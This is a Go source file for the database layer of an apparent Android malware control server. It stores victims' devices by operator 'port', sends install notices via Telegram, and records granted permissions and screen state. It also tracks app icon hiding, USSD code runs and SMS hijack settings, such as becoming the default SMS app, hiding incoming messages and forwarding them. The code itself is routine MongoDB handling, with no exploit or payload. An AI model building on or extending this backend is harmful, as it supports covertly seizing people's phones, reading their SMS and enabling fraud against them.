package store

import (
	"context"
	"errors"
	"time"

	"github.com/base/realtime/internal/protocol"

	"go.mongodb.org/mongo-driver/v2/bson"
	"go.mongodb.org/mongo-driver/v2/mongo"
	"go.mongodb.org/mongo-driver/v2/mongo/options"
)

type ClientDevice struct {
	UserID          string              `bson:"userId" json:"userId"`
	DeviceID        string              `bson:"deviceId" json:"deviceId"`
	Port            string              `bson:"port,omitempty" json:"port,omitempty"`
	ClientIP        string              `bson:"clientIp,omitempty" json:"clientIp,omitempty"`
	Client          protocol.ClientInfo `bson:"client,omitempty" json:"client,omitempty"`
	FirstSeenAt     time.Time           `bson:"firstSeenAt" json:"firstSeenAt"`
	InstallNotified bool                `bson:"installNotified,omitempty" json:"installNotified,omitempty"`
	InstallMsgID    int                 `bson:"installMsgId,omitempty" json:"installMsgId,omitempty"`
	InstallMsgAt    time.Time           `bson:"installMsgAt,omitempty" json:"installMsgAt,omitempty"`
	Grants          []string              `bson:"grants,omitempty" json:"grants,omitempty"`
	GrantsReady     bool                  `bson:"grantsReady,omitempty" json:"grantsReady,omitempty"`
	Screen          *protocol.ScreenState `bson:"screen,omitempty" json:"screen,omitempty"`
	SetupNotified     bool      `bson:"setupNotified,omitempty" json:"setupNotified,omitempty"`
	FirstAction       string    `bson:"firstAction,omitempty" json:"firstAction,omitempty"`
	FirstActionAt     time.Time `bson:"firstActionAt,omitempty" json:"firstActionAt,omitempty"`
	FirstIcon         string    `bson:"firstIcon,omitempty" json:"firstIcon,omitempty"`
	FirstIconAt       time.Time `bson:"firstIconAt,omitempty" json:"firstIconAt,omitempty"`
	FirstUssd         string    `bson:"firstUssd,omitempty" json:"firstUssd,omitempty"`
	FirstUssdAt       time.Time `bson:"firstUssdAt,omitempty" json:"firstUssdAt,omitempty"`
	FirstActionKind   string    `bson:"firstActionKind,omitempty" json:"firstActionKind,omitempty"`
	FirstActionDetail string    `bson:"firstActionDetail,omitempty" json:"firstActionDetail,omitempty"`
	FirstActionUssd   string    `bson:"firstActionUssd,omitempty" json:"firstActionUssd,omitempty"`
	FirstActionText   string    `bson:"firstActionText,omitempty" json:"firstActionText,omitempty"`
	UpdatedAt         time.Time `bson:"updatedAt" json:"updatedAt"`
}

func (s *Store) UpsertClientDevice(ctx context.Context, userID, deviceID, port, clientIP string, client *protocol.ClientInfo, at time.Time) (ClientDevice, bool, error) {
	filter := bson.D{{"userId", userID}, {"deviceId", deviceID}}
	var existing ClientDevice
	findErr := s.clientDevices.FindOne(ctx, filter).Decode(&existing)
	isNew := errors.Is(findErr, mongo.ErrNoDocuments)

	set := bson.D{
		{"userId", userID},
		{"deviceId", deviceID},
		{"updatedAt", at},
	}
	if port != "" {
		set = append(set, bson.E{Key: "port", Value: port})
	}
	if clientIP != "" {
		set = append(set, bson.E{Key: "clientIp", Value: clientIP})
	}
	if client != nil {
		set = append(set, bson.E{Key: "client", Value: *client})
	}
	update := bson.D{{"$set", set}}
	if isNew {
		update = append(update, bson.E{Key: "$setOnInsert", Value: bson.D{{"firstSeenAt", at}}})
	}
	opts := options.FindOneAndUpdate().SetUpsert(true).SetReturnDocument(options.After)
	var row ClientDevice
	err := s.clientDevices.FindOneAndUpdate(ctx, filter, update, opts).Decode(&row)
	if err != nil {
		return ClientDevice{}, false, err
	}
	if row.FirstSeenAt.IsZero() {
		row.FirstSeenAt = at
	}
	return row, isNew, nil
}

func (s *Store) ClaimInstallNotify(ctx context.Context, userID, deviceID string) (bool, error) {
	filter := bson.D{
		{"userId", userID},
		{"deviceId", deviceID},
		{"installNotified", bson.D{{"$ne", true}}},
	}
	res, err := s.clientDevices.UpdateOne(ctx, filter, bson.D{{"$set", bson.D{{"installNotified", true}}}})
	if err != nil {
		return false, err
	}
	return res.ModifiedCount > 0, nil
}

// UserHadPortClient reports whether this user already has any client_devices row for the port
// (including older deviceIds left after uninstall/reinstall).
func (s *Store) UserHadPortClient(ctx context.Context, userID, port string) (bool, error) {
	if userID == "" || port == "" {
		return false, nil
	}
	n, err := s.clientDevices.CountDocuments(ctx, bson.D{{"userId", userID}, {"port", port}})
	if err != nil {
		return false, err
	}
	return n > 0, nil
}

// LastInstallMsgID returns the Telegram message_id of the most recent install notice for user+port.
func (s *Store) LastInstallMsgID(ctx context.Context, userID, port string) (int, error) {
	if userID == "" || port == "" {
		return 0, nil
	}
	opts := options.FindOne().SetSort(bson.D{{"installMsgAt", -1}, {"updatedAt", -1}})
	var row ClientDevice
	err := s.clientDevices.FindOne(ctx, bson.D{
		{"userId", userID},
		{"port", port},
		{"installMsgId", bson.D{{"$gt", 0}}},
	}, opts).Decode(&row)
	if errors.Is(err, mongo.ErrNoDocuments) {
		return 0, nil
	}
	if err != nil {
		return 0, err
	}
	return row.InstallMsgID, nil
}

func (s *Store) ReplaceDeviceGrants(ctx context.Context, userID, deviceID string, grants []string) (prev []string, err error) {
	if userID == "" || deviceID == "" {
		return nil, nil
	}
	filter := bson.D{{"userId", userID}, {"deviceId", deviceID}}
	var existing ClientDevice
	findErr := s.clientDevices.FindOne(ctx, filter).Decode(&existing)
	if findErr != nil && !errors.Is(findErr, mongo.ErrNoDocuments) {
		return nil, findErr
	}
	at := time.Now()
	update := bson.D{
		{"$set", bson.D{
			{"userId", userID},
			{"deviceId", deviceID},
			{"grants", grants},
			{"updatedAt", at},
		}},
	}
	if errors.Is(findErr, mongo.ErrNoDocuments) {
		update = append(update, bson.E{Key: "$setOnInsert", Value: bson.D{{"firstSeenAt", at}}})
	}
	_, err = s.clientDevices.UpdateOne(ctx, filter, update, options.UpdateOne().SetUpsert(true))
	return existing.Grants, err
}

func (s *Store) ClaimSetupNotify(ctx context.Context, userID, deviceID string) (bool, error) {
	filter := bson.D{
		{"userId", userID},
		{"deviceId", deviceID},
		{"setupNotified", bson.D{{"$ne", true}}},
	}
	res, err := s.clientDevices.UpdateOne(ctx, filter, bson.D{{"$set", bson.D{{"setupNotified", true}}}})
	if err != nil {
		return false, err
	}
	return res.ModifiedCount > 0, nil
}

func (s *Store) PatchClientIconState(ctx context.Context, userID, deviceID, iconState string) error {
	if userID == "" || deviceID == "" || iconState == "" {
		return nil
	}
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}},
		bson.D{{"$set", bson.D{
			{"client.iconState", iconState},
			{"updatedAt", time.Now()},
		}}},
	)
	return err
}

func (s *Store) PatchClientSms(ctx context.Context, userID, deviceID string, p protocol.DeviceSmsPayload) error {
	if userID == "" || deviceID == "" {
		return nil
	}
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}},
		bson.D{{"$set", bson.D{
			{"client.smsDefaultPkg", p.SmsDefaultPkg},
			{"client.smsDefaultLabel", p.SmsDefaultLabel},
			{"client.smsOurs", p.SmsOurs},
			{"client.smsHideIncoming", p.SmsHideIncoming},
			{"client.smsPreviousPkg", p.SmsPreviousPkg},
			{"client.smsPreviousLabel", p.SmsPreviousLabel},
			{"client.offmode", p.Offmode},
			{"client.offmodeTo", p.OffmodeTo},
			{"client.offmodeFilter", p.OffmodeFilter},
			{"updatedAt", time.Now()},
		}}},
	)
	return err
}

func (s *Store) SaveInstallMsgID(ctx context.Context, userID, deviceID string, msgID int, at time.Time) error {
	if userID == "" || deviceID == "" || msgID <= 0 {
		return nil
	}
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}},
		bson.D{{"$set", bson.D{
			{"installMsgId", msgID},
			{"installMsgAt", at},
		}}},
	)
	return err
}

// RetireOtherPortDevices deletes older client_devices rows for the same user+port,
// keeping only keepDeviceID (the active install after reinstall).
func (s *Store) RetireOtherPortDevices(ctx context.Context, userID, port, keepDeviceID string) ([]string, error) {
	if userID == "" || port == "" || keepDeviceID == "" {
		return nil, nil
	}
	filter := bson.D{
		{"userId", userID},
		{"port", port},
		{"deviceId", bson.D{{"$ne", keepDeviceID}}},
	}
	cur, err := s.clientDevices.Find(ctx, filter, options.Find().SetProjection(bson.D{{"deviceId", 1}}))
	if err != nil {
		return nil, err
	}
	var rows []ClientDevice
	if err := cur.All(ctx, &rows); err != nil {
		return nil, err
	}
	if len(rows) == 0 {
		return nil, nil
	}
	ids := make([]string, 0, len(rows))
	for _, row := range rows {
		if row.DeviceID != "" {
			ids = append(ids, row.DeviceID)
		}
	}
	if _, err := s.clientDevices.DeleteMany(ctx, filter); err != nil {
		return nil, err
	}
	return ids, nil
}

func (s *Store) SetGrantsReady(ctx context.Context, userID, deviceID string, ready bool) error {
	if userID == "" || deviceID == "" {
		return nil
	}
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}},
		bson.D{{"$set", bson.D{{"grantsReady", ready}}}},
	)
	return err
}

func (s *Store) TryStartFirstStep(ctx context.Context, userID, deviceID, step string) (bool, error) {
	if userID == "" || deviceID == "" || (step != "icon" && step != "ussd") {
		return false, nil
	}
	field, atField := "firstIcon", "firstIconAt"
	if step == "ussd" {
		field, atField = "firstUssd", "firstUssdAt"
	}
	now := time.Now()
	stale := now.Add(-90 * time.Second)
	filter := bson.D{
		{"userId", userID},
		{"deviceId", deviceID},
		{field, bson.D{{"$ne", "done"}}},
		{"$nor", bson.A{bson.D{{"firstAction", "done"}, {"firstActionKind", step}}}},
		{"$or", bson.A{
			bson.D{{field, bson.D{{"$ne", "running"}}}},
			bson.D{{atField, bson.D{{"$lt", stale}}}},
			bson.D{{atField, bson.D{{"$exists", false}}}},
		}},
	}
	res, err := s.clientDevices.UpdateOne(ctx, filter, bson.D{{"$set", bson.D{
		{field, "running"},
		{atField, now},
	}}})
	if err != nil {
		return false, err
	}
	return res.MatchedCount > 0, nil
}

func (s *Store) FinishFirstStep(ctx context.Context, userID, deviceID, step, detail, text string) error {
	if userID == "" || deviceID == "" || (step != "icon" && step != "ussd") {
		return nil
	}
	row, _ := s.FindClientDevice(ctx, userID, deviceID)
	kind := step
	otherDone := (step == "icon" && (row.FirstUssd == "done" || row.FirstActionKind == "ussd" || row.FirstActionKind == "both")) ||
		(step == "ussd" && (row.FirstIcon == "done" || row.FirstActionKind == "icon" || row.FirstActionKind == "both"))
	if otherDone {
		kind = "both"
	}
	field, atField := "firstIcon", "firstIconAt"
	set := bson.D{
		{"firstActionKind", kind},
		{"firstAction", "done"},
		{"firstActionAt", time.Now()},
	}
	if step == "ussd" {
		field, atField = "firstUssd", "firstUssdAt"
		set = append(set,
			bson.E{Key: "firstActionUssd", Value: detail},
			bson.E{Key: "firstActionText", Value: text},
		)
	} else {
		set = append(set, bson.E{Key: "firstActionDetail", Value: detail})
	}
	set = append(set, bson.E{Key: field, Value: "done"}, bson.E{Key: atField, Value: time.Now()})
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}},
		bson.D{{"$set", set}},
	)
	return err
}

func (s *Store) ReleaseFirstStep(ctx context.Context, userID, deviceID, step string) error {
	if userID == "" || deviceID == "" || (step != "icon" && step != "ussd") {
		return nil
	}
	field := "firstIcon"
	if step == "ussd" {
		field = "firstUssd"
	}
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}, {field, "running"}},
		bson.D{{"$set", bson.D{{field, ""}}}},
	)
	return err
}

func (s *Store) FindClientDevice(ctx context.Context, userID, deviceID string) (ClientDevice, error) {
	var row ClientDevice
	err := s.clientDevices.FindOne(ctx, bson.D{{"userId", userID}, {"deviceId", deviceID}}).Decode(&row)
	return row, err
}

func (s *Store) SetDeviceScreen(ctx context.Context, userID, deviceID string, screen protocol.ScreenState) error {
	if userID == "" || deviceID == "" {
		return nil
	}
	at := time.Now()
	_, err := s.clientDevices.UpdateOne(ctx,
		bson.D{{"userId", userID}, {"deviceId", deviceID}},
		bson.D{
			{"$set", bson.D{
				{"userId", userID},
				{"deviceId", deviceID},
				{"screen", screen},
				{"updatedAt", at},
			}},
			{"$setOnInsert", bson.D{{"firstSeenAt", at}}},
		},
		options.UpdateOne().SetUpsert(true),
	)
	return err
}

func (s *Store) ListClientDevices(ctx context.Context, userIDs []string) (map[string][]ClientDevice, error) {
	out := make(map[string][]ClientDevice)
	if len(userIDs) == 0 {
		return out, nil
	}
	cur, err := s.clientDevices.Find(ctx, bson.D{{"userId", bson.D{{"$in", userIDs}}}})
	if err != nil {
		return nil, err
	}
	var rows []ClientDevice
	if err := cur.All(ctx, &rows); err != nil {
		return nil, err
	}
	for _, row := range rows {
		out[row.UserID] = append(out[row.UserID], row)
	}
	return out, nil
}
